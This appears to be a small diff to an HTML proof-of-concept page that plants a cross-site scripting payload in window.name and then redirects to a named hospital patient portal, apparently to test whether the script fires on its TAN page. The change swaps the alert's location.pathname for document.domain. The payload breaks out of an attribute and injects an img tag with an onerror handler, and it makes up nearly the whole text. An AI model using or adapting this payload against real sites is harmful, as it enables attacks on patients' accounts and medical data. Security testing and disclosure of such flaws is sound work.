@@ -10,7 +10,7 @@
 
 <script>
 // Simple alert to test if XSS fires on TAN page
-window.name = '"><img src=x onerror="alert(\'XSS on: \'+location.pathname)"><input value="';
+window.name = '"><img src=x onerror="alert(\'XSS on: \'+document.domain)"><input value="';
 
 setTimeout(function(){
     location = 'https://patientenportal.akhwien.at/Patientenportal';
